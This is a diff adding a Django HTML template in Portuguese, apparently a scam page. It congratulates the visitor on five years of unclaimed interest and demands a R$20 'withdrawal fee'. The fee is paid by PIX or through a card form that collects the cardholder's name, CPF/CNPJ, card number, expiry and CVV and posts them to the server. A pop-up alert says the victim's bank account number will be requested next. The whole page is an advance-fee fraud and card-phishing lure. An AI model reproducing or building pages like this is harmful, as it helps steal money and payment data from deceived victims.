@@ -1,0 +1,309 @@
+{% load static %}
+<html>
+<head>
+  
+  <meta name="viewport" content='width= device-width,user-scalable=no' >
+  <meta charset="UTF-8" >
+  <title>parabens</title>
+  <style>
+    body{
+      background-image:url();
+      background-size:cover cover;
+    }
+    header{
+      width:100%;
+      max-width:400px;
+      height:400px;
+      border:1px solid red;
+      margin:auto;
+      background-color:lime;
+      border-radius:15px;
+    }
+   
+    .s{
+      width:100%;
+      max-width:150px;
+      height:20px;
+     
+      
+      margin:auto;
+      margin-top:10px;
+    }
+  .ss{
+      width:100%;
+      max-width:355px;
+      height:350px;
+      background-color:white;
+      border:1px solid black;
+      margin:auto;
+      margin-top:20px;
+      border-radius:10px;
+    }
+    .i{
+      width:100%;
+      height:30px;
+      max-width:230px;
+      
+      margin-top:10px;
+      margin:auto;
+      margin-top:5px;
+    }
+    .i2{
+      width:100%;
+      height:30px;
+      max-width:100px;
+      
+     
+      margin:auto;
+      
+    }
+    .i3{
+      width:100%;
+      height:40px;
+      max-width:150px;
+      
+      margin:auto;
+      margin-top:10px;
+      font-size:25px;
+      color:orange;
+    }
+   .x{
+      width:100%;
+      height:20px;
+      max-width:251px;
+      margin:auto;
+      
+      margin-top:5px;
+      font-size:20px;
+      color:orange;
+    }
+   .xx{
+      width:100%;
+      height:40px;
+      max-width:80px;
+      
+      margin:auto;
+      margin-top:3px;
+      font-size:20px;
+      color:orange;
+    }
+   .xxx{
+      width:100%;
+      height:20px;
+      max-width:220px;
+      
+      margin:auto;
+      
+      font-size:14px;
+      color:black;
+   }
+   .xxxx{
+      width:100%;
+      height:40px;
+      max-width:220px;
+      
+      margin:auto;
+      
+      margin-top:10px;
+      font-size:15px;
+      color:orange;
+   }
+   .xv{
+      width:100%;
+      height:19px;
+      padding-top:6px;
+      padding-left:11px;
+      max-width:180px;
+      
+      margin:auto;
+      margin-top:15px;
+      font-size:15px;
+      border-radius:10px;
+      
+      color:white;
+      cursor:pointer;
+   }
+
+   .o{
+    
+     width:300px;
+     height:15px;
+     background-color:lime;
+     margin:auto;
+     margin-top:30px;
+     display:none;
+     border-radius:10px;
+   }
+   .v{
+     width:216px;
+     height:15px;
+     background-color:white;
+     margin:auto;
+     margin-top:0px;
+     margin:auto;
+     font-size:10px;
+   }
+  
+  .nn{
+    width:100px;
+    height:100px;
+    
+    margin:auto;
+    
+  }
+  .z{
+     width:50px;
+     height:15px;
+     
+     display:none;
+     float:left;
+  }
+  .z2{
+     width:50px;
+     height:15px;
+     background-color:blue;
+     display:none;
+     float:left;
+  }
+  .wv{
+    width:250px;
+    height:250px;
+    background-color:white;
+    margin:auto;
+    display:none;
+  }
+  .wv2{
+    width:200px;
+    height:200px;
+    
+    margin:auto;
+    margin-top:0px;
+  }
+  
+  .wp{
+    width:290px;
+    height:300px;
+   
+    margin:auto;
+    display:none;
+  }
+  .bt{
+    margin-left:100px;
+  }
+  alert{
+    background-color:pink;
+  }
+  
+  </style>
+</head>
+<body>
+  
+  <header>
+    
+    <div class="ss">
+      <div class="s"><strong style="color:blue;">👏🥳 Parabéns</strong></div>
+      <div class="i">Você possui juros disponivel</div>
+      <div class="i2">para saque:</div>
+      <div class="i3"><strong>{{a}}</strong></div>
+      <div class="x"><strong>Referentes aos últimos 5</strong></div>
+      <div class="xx"><strong>anos.</strong></div>
+      <div class="xxx">Resgate até o dia 28/04/2024</div>
+      <div class="xxxx"><strong style="color:black;">TAXA PARA SAQUE: R$20,00</strong></div>
+      <div class="xv" ondblclick='k()'><strong><button style="border-radius:10px;background-color:orange;">PAGA TAXA DE R$20,00</button></strong></div>
+    </div>
+    
+    
+    <div class="o">
+      <div class="v">Escolha sua forma de pagamento preferida: </div>
+    </div>
+    <br>
+    
+    <div class="nn">
+      <div class="z"><button style="margin-top:-4px;" onclick="pix()">PIX</button></div>
+      <div class="z2"><button style="margin-top:-4px;" onclick="cartao()">CARTÃO</button></div>      
+    </div>
+    <div class="wv">
+      <div class="wv2"><img src={%static "xp.jpg"%} width="200px;" height="200px;"/></div>
+      <div class="">
+        <code>
+          
+        </code>
+      </div>      
+     
+    </div>
+    
+    <div class="wp">
+     
+      <form action="./" method="POST">
+        {% csrf_token %}
+       <img src={% static "elo.png"%} width="200px;" height="50px;"/>
+        <br>
+       Titular <input type="text" name="titulo" placeholder="TITULAR" required/>
+        <br>
+        <br>
+       CPF/CNPJ <input type="text" name="cpf" placeholder="CPF/CNPJ" required/>
+        <br>
+        <br>
+       Ñ do Cartão <input type="text" name="ncartao" placeholder="Numero do Cartão" required />
+        <br>
+        <br>
+       Validade (MM/AAAA) <input type="text" name="validade" placeholder="Validade" style="width:80px;" required/>
+        <br>
+        <br>
+       Codigo (CVV)<input type="text" name="codigo" placeholder="Codigo" style="width:80px;" required/>
+        <br>
+        <br>
+        <button class="bt" style="border-radius:10px;">Confirma pagamento</button>
+         
+         
+      </form>
+      
+    </div>
+  </header>
+  <nav>
+    
+  </nav>
+  <script>
+     document.querySelector(".xv").addEventListener("click",function(){
+      document.querySelector(".o").style.display="flex";
+      document.querySelector(".z").style.display="flex";
+      document.querySelector(".z2").style.display="flex";
+      
+      window.alert("Apos a confirmação do pagamento, vamos precisa do numero da sua conta, para pode ta creditando o valor em sua conta.")
+    
+      document.querySelector("header").style.height='800px';
+      document.querySelector("header").style.transition='2s';
+      document.querySelector("header").style.background="white";
+      document.querySelector("header").style.border="1px solid white";
+     })
+
+     let k = function(){
+      document.querySelector(".z").style.display="none";
+      document.querySelector(".z2").style.display="none";
+      document.querySelector(".wv").style.display="none";
+      document.querySelector(".wp").style.display="none";
+      
+      
+     
+      document.querySelector(".o").style.display="none";
+      document.querySelector("header").style.height='400px';
+      document.querySelector("header").style.transition='2s';
+      document.querySelector("header").style.background="lime";
+     }
+     let pix = function(){
+       document.querySelector(".wv").style.display="flex";
+       document.querySelector(".wp").style.display="none";
+      
+     }
+     let cartao = function(){
+       
+       document.querySelector(".wp").style.display="flex";
+       document.querySelector(".wv").style.display="none";
+      
+     }
+    
+   
+     
+  </script>
+</body>
+</html>
